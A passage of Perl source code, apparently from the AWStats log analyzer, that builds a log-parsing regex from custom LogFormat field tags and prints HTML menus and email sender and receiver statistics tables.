s/cs-transport/%other/g;\n\t\t$LogFormatString =~\n\t\t  s/s-operation/%method/g;    # GET, POST, SMTP, RETR STOR\n\t\t$LogFormatString =~ s/cs-mime-type/%other/g;\n\t\t$LogFormatString =~ s/s-object-source/%other/g;\n\t\t$LogFormatString =~ s/s-cache-info/%other/g;\n\t\t$LogFormatString =~ s/cluster-node/%cluster/g;\n\t\t$LogFormatString =~ s/s-sitename/%other/g;\n\t\t$LogFormatString =~ s/s-ip/%other/g;\n\t\t$LogFormatString =~ s/s-port/%other/g;\n\t\t$LogFormatString =~ s/cs\\(Cookie\\)/%other/g;\n\t\t$LogFormatString =~ s/sc-substatus/%other/g;\n\t\t$LogFormatString =~ s/sc-win32-status/%other/g;\n\n\n\t\t# Added for MMS\n\t\t$LogFormatString =~\n\t\t  s/protocol/%protocolmms/g;    # cs-method might not be available\n\t\t$LogFormatString =~\n\t\t  s/c-status/%codemms/g;    # c-status used when sc-status not available\n\t\tif ($Debug) { debug(\" LogFormatString=$LogFormatString\"); }\n\n# $LogFormatString has an AWStats format, so we can generate PerlParsingFormat variable\n\t\tmy $i                       = 0;\n\t\tmy $LogSeparatorWithoutStar = $LogSeparator;\n\t\t$LogSeparatorWithoutStar =~ s/[\\*\\+]//g;\n\t\tforeach my $f ( split( /\\s+/, $LogFormatString ) ) {\n\n\t\t\t# Add separator for next field\n\t\t\tif ($PerlParsingFormat) { $PerlParsingFormat .= \"$LogSeparator\"; }\n\n\t\t\t# If field is prefixed with custom string, just push it to regex literally\n\t\t\tif ( $f =~ /^([^%]+)%/ ) {\n\t\t\t\t$PerlParsingFormat .= \"$1\"\n                        }\n\n\t\t\t# Special for logname\n\t\t\tif ( $f =~ /%lognamequot$/ ) {\n\t\t\t\t$pos_logname = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'logname';\n\t\t\t\t$PerlParsingFormat .=\n\t\t\t\t  \"\\\\\\\"?([^\\\\\\\"]*)\\\\\\\"?\"\n\t\t\t\t  ; # logname can be \"value\", \"\" and - in same log (Lotus notes)\n\t\t\t}\n\t\t\telsif ( $f =~ /%logname$/ ) {\n\t\t\t\t$pos_logname = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'logname';\n\n# %u (user) is \"([^\\\\/\\\\[]+)\" instead of \"[^$LogSeparatorWithoutStar]+\" because can contain space (Lotus Notes).\n\t\t\t\t$PerlParsingFormat .= \"([^\\\\/\\\\[]+)\";\n\t\t\t}\n\n\t\t\t# Date format\n\t\t\telsif ( $f =~ /%time1$/ || $f =~ /%time1b$/ )\n\t\t\t{ # [dd/mmm/yyyy:hh:mm:ss +0000] or [dd/mmm/yyyy:hh:mm:ss],  time1b kept for backward compatibility\n\t\t\t\t$pos_date = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'date';\n\t\t\t\t$pos_tz = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'tz';\n\t\t\t\t$PerlParsingFormat .=\n\"\\\\[([^$LogSeparatorWithoutStar]+)( [^$LogSeparatorWithoutStar]+)?\\\\]\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%time2$/ ) {    # yyyy-mm-dd hh:mm:ss\n\t\t\t\t$pos_date = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'date';\n\t\t\t\t$PerlParsingFormat .=\n\"([^$LogSeparatorWithoutStar]+\\\\s[^$LogSeparatorWithoutStar]+)\";                        # Need \\s for Exchange log files\n\t\t\t}\n\t\t\telsif ( $f =~ /%time3$/ )\n\t\t\t{ # mon d hh:mm:ss  or  mon  d hh:mm:ss  or  mon dd hh:mm:ss yyyy  or  day mon dd hh:mm:ss  or  day mon dd hh:mm:ss yyyy\n\t\t\t\t$pos_date = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'date';\n\t\t\t\t$PerlParsingFormat .=\n\"(?:\\\\w\\\\w\\\\w )?(\\\\w\\\\w\\\\w \\\\s?\\\\d+ \\\\d\\\\d:\\\\d\\\\d:\\\\d\\\\d(?: \\\\d\\\\d\\\\d\\\\d)?)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%time4$/ ) {    # ddddddddddddd\n\t\t\t\t$pos_date = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'date';\n\t\t\t\t$PerlParsingFormat .= \"(\\\\d+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%time5$/ ) {\n\t\t\t\t# Supports the following formats:\n\t\t\t\t# - yyyy-mm-ddThh:mm:ss           (Incomplete ISO 8601)\n\t\t\t\t# - yyyy-mm-ddThh:mm:ssZ          (ISO 8601, zero meridian)\n\t\t\t\t# - yyyy-mm-ddThh:mm:ss+00:00     (ISO 8601)\n\t\t\t\t# - yyyy-mm-ddThh:mm:ss+0000      (Apache's best approximation to ISO 8601 using \"%{%Y-%m-%dT%H:%M:%S%z}t\" in LogFormat)\n\t\t\t\t# - yyyy-mm-ddThh:mm:ss.000000Z   (Amazon AWS log files)\n\t\t\t\t$pos_date = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'date';\n\t\t\t\t$pos_tz = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'tz';\n\t\t\t\t$PerlParsingFormat .=\n\"([^$LogSeparatorWithoutStar]+T[^$LogSeparatorWithoutStar]+)(Z|[-+\\.]\\\\d\\\\d[:\\\\.\\\\dZ]*)?\";\n\t\t\t}\n\n\t\t\t# Special for methodurl, methodurlprot and methodurlnoprot\n\t\t\telsif ( $f =~ /%methodurl$/ ) {\n\t\t\t\t$pos_method = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'method';\n\t\t\t\t$pos_url = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'url';\n\t\t\t\t$PerlParsingFormat .=\n\n#\"\\\\\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+) [^\\\\\\\"]+\\\\\\\"\";\n\"\\\\\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+)(?: [^\\\\\\\"]+|)\\\\\\\"\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%methodurlprot$/ ) {\n\t\t\t\t$pos_method = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'method';\n\t\t\t\t$pos_url = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'url';\n\t\t\t\t$PerlParsingFormat .=\n\"\\\\\\\"([^$LogSeparatorWithoutStar]+) ([^\\\\\\\"]+) ([^\\\\\\\"]+)\\\\\\\"\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%methodurlnoprot$/ ) {\n\t\t\t\t$pos_method = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'method';\n\t\t\t\t$pos_url = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'url';\n\t\t\t\t$PerlParsingFormat .=\n\"\\\\\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+)\\\\\\\"\";\n\t\t\t}\n\n\t\t\t# Common command tags\n\t\t\telsif ( $f =~ /%virtualnamequot$/ ) {\n\t\t\t\t$pos_vh = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'vhost';\n\t\t\t\t$PerlParsingFormat .= \"\\\\\\\"([^$LogSeparatorWithoutStar]+)\\\\\\\"\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%virtualname$/ ) {\n\t\t\t\t$pos_vh = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'vhost';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%host_r$/ ) {\n\t\t\t\t$pos_hostr = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'hostr';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%host$/ ) {\n\t\t\t\t$pos_host = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'host';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%host_proxy$/ )\n\t\t\t{    # if host_proxy tag used, host tag must not be used\n\t\t\t\t$pos_host = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'host';\n\t\t\t\t$PerlParsingFormat .= \"(.+?)(?:, .*)*\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%method$/ ) {\n\t\t\t\t$pos_method = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'method';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%url$/ ) {\n\t\t\t\t$pos_url = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'url';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%query$/ ) {\n\t\t\t\t$pos_query = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'query';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%code$/ ) {\n\t\t\t\t$pos_code = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'code';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%bytesd$/ ) {\n\t\t\t\t$pos_size = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'size';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%refererquot$/ ) {\n\t\t\t\t$pos_referer = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'referer';\n\t\t\t\t$PerlParsingFormat .=\n\t\t\t\t  \"\\\\\\\"([^\\\\\\\"]*)\\\\\\\"\";    # referer might be \"\"\n\t\t\t}\n\t\t\telsif ( $f =~ /%referer$/ ) {\n\t\t\t\t$pos_referer = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'referer';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%uaquot$/ ) {\n\t\t\t\t$pos_agent = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'ua';\n\t\t\t\t$PerlParsingFormat .= \"\\\\\\\"([^\\\\\\\"]*)\\\\\\\"\";    # ua might be \"\"\n\t\t\t}\n\t\t\telsif ( $f =~ /%uabracket$/ ) {\n\t\t\t\t$pos_agent = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'ua';\n\t\t\t\t$PerlParsingFormat .= \"\\\\\\[([^\\\\\\]]*)\\\\\\]\";    # ua might be []\n\t\t\t}\n\t\t\telsif ( $f =~ /%ua$/ ) {\n\t\t\t\t$pos_agent = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'ua';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%gzipin$/ ) {\n\t\t\t\t$pos_gzipin = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'gzipin';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%gzipout/ )\n\t\t\t{ # Compare $f to /%gzipout/ and not to /%gzipout$/ like other fields\n\t\t\t\t$pos_gzipout = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'gzipout';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%gzipratio/ )\n\t\t\t{ # Compare $f to /%gzipratio/ and not to /%gzipratio$/ like other fields\n\t\t\t\t$pos_compratio = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'gzipratio';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%deflateratio/ )\n\t\t\t{ # Compare $f to /%deflateratio/ and not to /%deflateratio$/ like other fields\n\t\t\t\t$pos_compratio = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'deflateratio';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%email_r$/ ) {\n\t\t\t\t$pos_emailr = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'email_r';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%email$/ ) {\n\t\t\t\t$pos_emails = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'email';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%cluster$/ ) {\n\t\t\t\t$pos_cluster = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'clusternb';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%timetaken$/ ) {\n\t\t\t\t$pos_timetaken = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'timetaken';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\n# Special for protocolmms, used for method if method not already found (for MMS)\n\t\t\telsif ( $f =~ /%protocolmms$/ ) {\n\t\t\t\tif ( $pos_method < 0 ) {\n\t\t\t\t\t$pos_method = $i;\n\t\t\t\t\t$i++;\n\t\t\t\t\tpush @fieldlib, 'method';\n\t\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t\t}\n\t\t\t}\n\n   # Special for codemms, used for code only if code not already found (for MMS)\n\t\t\telsif ( $f =~ /%codemms$/ ) {\n\t\t\t\tif ( $pos_code < 0 ) {\n\t\t\t\t\t$pos_code = $i;\n\t\t\t\t\t$i++;\n\t\t\t\t\tpush @fieldlib, 'code';\n\t\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Extra tag\n\t\t\telsif ( $f =~ /%extra(\\d+)$/ ) {\n\t\t\t\t$pos_extra[$1] = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, \"extra$1\";\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\n\t\t\t# Other tag\n\t\t\telsif ( $f =~ /%other$/ ) {\n\t\t\t\t$PerlParsingFormat .= \"[^$LogSeparatorWithoutStar]+\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%otherquot$/ ) {\n\t\t\t\t$PerlParsingFormat .= \"\\\\\\\"[^\\\\\\\"]*\\\\\\\"\";\n\t\t\t}\n\n\t\t\t# Unknown tag (no parenthesis)\n\t\t\telse {\n\t\t\t\t$PerlParsingFormat .= \"[^$LogSeparatorWithoutStar]+\";\n\t\t\t}\n\t\t}\n\t\tif ( !$PerlParsingFormat ) {\n\t\t\terror(\"No recognized format tag in personalized LogFormat string\");\n\t\t}\n\t}\n\tif ( $pos_host < 0 ) {\n\t\terror(\n\"Your personalized LogFormat does not include all fields required by AWStats (Add \\%host in your LogFormat string).\"\n\t\t);\n\t}\n\tif ( $pos_date < 0 ) {\n\t\terror(\n\"Your personalized LogFormat does not include all fields required by AWStats (Add \\%time1 or \\%time2 in your LogFormat string).\"\n\t\t);\n\t}\n\tif ( $pos_method < 0 ) {\n\t\terror(\n\"Your personalized LogFormat does not include all fields required by AWStats (Add \\%methodurl or \\%method in your LogFormat string).\"\n\t\t);\n\t}\n\tif ( $pos_url < 0 ) {\n\t\terror(\n\"Your personalized LogFormat does not include all fields required by AWStats (Add \\%methodurl or \\%url in your LogFormat string).\"\n\t\t);\n\t}\n\tif ( $pos_code < 0 ) {\n\t\terror(\n\"Your personalized LogFormat does not include all fields required by AWStats (Add \\%code in your LogFormat string).\"\n\t\t);\n\t}\n#\tif ( $pos_size < 0 ) {\n#\t\terror(\n#\"Your personalized LogFormat does not include all fields required by AWStats (Add \\%bytesd in your LogFormat string).\"\n#\t\t);\n#\t}\n\t$PerlParsingFormat = qr/^$PerlParsingFormat/;\n\tif ($Debug) { debug(\" PerlParsingFormat is $PerlParsingFormat\"); }\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints a menu category for the frame or static header\n# Parameters:   -\n# Input:        $categ, $categtext, $categicon, $frame, $targetpage, $linkanchor,\n#\t\t\t\t$NewLinkParams, $NewLinkTarget\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowMenuCateg {\n\tmy ( $categ, $categtext, $categicon, $frame, $targetpage, $linkanchor,\n\t\t$NewLinkParams, $NewLinkTarget )\n\t  = ( shift, shift, shift, shift, shift, shift, shift, shift );\n\t$categicon = '';    # Comment this to enabme category icons\n\tmy ( $menu, $menulink, $menutext ) = ( shift, shift, shift );\n\tmy $linetitle = 0;\n\n\t# Call to plugins' function AddHTMLMenuLink\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuLink'} } ) {\n\n# my $function=\"AddHTMLMenuLink_$pluginname('$categ',\\$menu,\\$menulink,\\$menutext)\";\n# eval(\"$function\");\n\t\tmy $function = \"AddHTMLMenuLink_$pluginname\";\n\t\t&$function( $categ, $menu, $menulink, $menutext );\n\t}\n\tforeach my $key (%$menu) {\n\t\tif ( $menu->{$key} && $menu->{$key} > 0 ) { $linetitle++; last; }\n\t}\n\tif ( !$linetitle ) { return; }\n\n# At least one entry in menu for this category, we can show category and entries\n\tmy $WIDTHMENU1 = ( $FrameName eq 'mainleft' ? $FRAMEWIDTH : 150 );\n\tprint \"<tr><td class=\\\"awsm\\\" width=\\\"$WIDTHMENU1\\\"\"\n\t  . ( $frame ? \"\" : \" valign=\\\"top\\\"\" ) . \">\"\n\t  . ( $categicon ? \"<img src=\\\"$DirIcons/other/$categicon\\\" />&nbsp;\" : \"\" )\n\t  . \"<b>$categtext:</b></td>\\n\";\n\tprint( $frame? \"</tr>\\n\" : \"<td class=\\\"awsm\\\">\" );\n\tforeach my $key ( sort { $menu->{$a} <=> $menu->{$b} } keys %$menu ) {\n\t\tif ( $menu->{$key} == 0 )     { next; }\n\t\tif ( $menulink->{$key} == 1 ) {\n\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\tprint\n\t\t\t  \"<a href=\\\"$linkanchor#$key\\\"$targetpage>$menutext->{$key}</a>\";\n\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t}\n\t\tif ( $menulink->{$key} == 2 ) {\n\t\t\tprint( $frame\n\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t: \"\"\n\t\t\t);\n\t\t\tprint \"<a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t  || !$StaticLinks\n\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=$key\")\n\t\t\t\t: \"$StaticLinks.$key.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\"$NewLinkTarget>$menutext->{$key}</a>\\n\";\n\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t}\n\t}\n\tprint( $frame? \"\" : \"</td></tr>\\n\" );\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints HTML to display an email senders chart\n# Parameters:   -\n# Input:        $NewLinkParams, NewLinkTarget\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowEmailSendersChart {\n\tmy $NewLinkParams         = shift;\n\tmy $NewLinkTarget         = shift;\n\tmy $MaxLengthOfShownEMail = 48;\n\n\tmy $total_p;\n\tmy $total_h;\n\tmy $total_k;\n\tmy $max_p;\n\tmy $max_h;\n\tmy $max_k;\n\tmy $rest_p;\n\tmy $rest_h;\n\tmy $rest_k;\n\n\t# Show filter form\n\t#&ShowFormFilter(\"emailsfilter\",$EmailsFilter);\n\t# Show emails list\n\n\tprint \"$Center<a name=\\\"emailsenders\\\">&nbsp;</a><br />\\n\";\n\tmy $title;\n\tif ( $HTMLOutput{'allemails'} || $HTMLOutput{'lastemails'} ) {\n\t\t$title = \"$Message[131]\";\n\t}\n\telse {\n\t\t$title =\n\"$Message[131] ($Message[77] $MaxNbOf{'EMailsShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=allemails\")\n\t\t\t: \"$StaticLinks.allemails.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\t\tif ( $ShowEMailSenders =~ /L/i ) {\n\t\t\t$title .= \" &nbsp; - &nbsp; <a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t  || !$StaticLinks\n\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=lastemails\")\n\t\t\t\t: \"$StaticLinks.lastemails.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\"$NewLinkTarget>$Message[9]</a>\";\n\t\t}\n\t}\n\t&tab_head( \"$title\", 19, 0, 'emailsenders' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"3\\\">$Message[131] : \"\n\t  . ( scalar keys %_emails_h ) . \"</th>\";\n\tif ( $ShowEMailSenders =~ /H/i ) {\n\t\tprint \"<th rowspan=\\\"2\\\" bgcolor=\\\"#$color_h\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</th>\";\n\t}\n\tif ( $ShowEMailSenders =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" rowspan=\\\"2\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</th>\";\n\t}\n\tif ( $ShowEMailSenders =~ /M/i ) {\n\t\tprint\n\"<th rowspan=\\\"2\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[106]</th>\";\n\t}\n\tif ( $ShowEMailSenders =~ /L/i ) {\n\t\tprint \"<th rowspan=\\\"2\\\" width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th width=\\\"30%\\\">Local</th><th>&nbsp;</th><th width=\\\"30%\\\">External</th></tr>\";\n\t$total_p = $total_h = $total_k = 0;\n\t$max_h = 1;\n\tforeach ( values %_emails_h ) {\n\t\tif ( $_ > $max_h ) { $max_h = $_; }\n\t}\n\t$max_k = 1;\n\tforeach ( values %_emails_k ) {\n\t\tif ( $_ > $max_k ) { $max_k = $_; }\n\t}\n\tmy $count = 0;\n\tif ( !$HTMLOutput{'allemails'} && !$HTMLOutput{'lastemails'} ) {\n\t\t&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \\%_emails_h,\n\t\t\t\\%_emails_h );\n\t}\n\tif ( $HTMLOutput{'allemails'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \\%_emails_h,\n\t\t\t\\%_emails_h );\n\t}\n\tif ( $HTMLOutput{'lastemails'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \\%_emails_h,\n\t\t\t\\%_emails_l );\n\t}\n\tforeach my $key (@keylist) {\n\t\tmy $newkey = $key;\n\t\tif ( length($key) > $MaxLengthOfShownEMail ) {\n\t\t\t$newkey = substr( $key, 0, $MaxLengthOfShownEMail ) . \"...\";\n\t\t}\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h = int( $BarWidth * $_emails_h{$key} / $max_h ) + 1;\n\t\t}\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k = int( $BarWidth * $_emails_k{$key} / $max_k ) + 1;\n\t\t}\n\t\tprint \"<tr>\";\n\t\tmy $direction = IsLocalEMail($key);\n\n\t\tif ( $direction > 0 ) {\n\t\t\tprint \"<td class=\\\"aws\\\">$newkey</td><td>-&gt;</td><td>&nbsp;</td>\";\n\t\t}\n\t\tif ( $direction == 0 ) {\n\t\t\tprint\n\"<td colspan=\\\"3\\\"><span style=\\\"color: #$color_other\\\">$newkey</span></td>\";\n\t\t}\n\t\tif ( $direction < 0 ) {\n\t\t\tprint \"<td class=\\\"aws\\\">&nbsp;</td><td>&lt;-</td><td>$newkey</td>\";\n\t\t}\n\t\tif ( $ShowEMailSenders =~ /H/i ) { print \"<td>$_emails_h{$key}</td>\"; }\n\t\tif ( $ShowEMailSenders =~ /B/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . Format_Bytes( $_emails_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailSenders =~ /M/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . Format_Bytes( $_emails_k{$key} / ( $_emails_h{$key} || 1 ) )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailSenders =~ /L/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . ( $_emails_l{$key} ? Format_Date( $_emails_l{$key}, 1 ) : '-' )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t#$total_p += $_emails_p{$key};\n\t\t$total_h += $_emails_h{$key};\n\t\t$total_k += $_emails_k{$key};\n\t\t$count++;\n\t}\n\t$rest_p = 0;                        # $rest_p=$TotalPages-$total_p;\n\t$rest_h = $TotalHits - $total_h;\n\t$rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 ) { # All other sender emails\n\t\tprint\n\"<tr><td colspan=\\\"3\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowEMailSenders =~ /H/i ) { print \"<td>$rest_h</td>\"; }\n\t\tif ( $ShowEMailSenders =~ /B/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailSenders =~ /M/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . Format_Bytes( $rest_k / ( $rest_h || 1 ) ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailSenders =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints HTML to display an email receivers chart\n# Parameters:   -\n# Input:        $NewLinkParams, NewLinkTarget\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowEmailReceiversChart {\n\tmy $NewLinkParams         = shift;\n\tmy $NewLinkTarget         = shift;\n\tmy $MaxLengthOfShownEMail = 48;\n\n\tmy $total_p;\n\tmy $total_h;\n\tmy $total_k;\n\tmy $max_p;\n\tmy $max_h;\n\tmy $max_k;\n\tmy $rest_p;\n\tmy $rest_h;\n\tmy $rest_k;\n\n\t# Show filter form\n\t#&ShowFormFilter(\"emailrfilter\",$EmailrFilter);\n\t# Show emails list\n\n\tprint \"$Center<a name=\\\"emailreceivers\\\">&nbsp;</a><br />\\n\";\n\tmy $title;\n\tif ( $HTMLOutput{'allemailr'} || $HTMLOutput{'lastemailr'} ) {\n\t\t$title = \"$Message[132]\";\n\t}\n\telse {\n\t\t$title =\n\"$Message[132] ($Message[77] $MaxNbOf{'EMailsShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=allemailr\")\n\t\t\t: \"$StaticLinks.allemailr.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\t\tif ( $ShowEMailReceivers =~ /L/i ) {\n\t\t\t$title .= \" &nbsp; - &nbsp; <a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t  || !$StaticLinks\n\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=lastemailr\")\n\t\t\t\t: \"$StaticLinks.lastemailr.$StaticExt\"\n\t\t\t  )\n\t\t\t  . 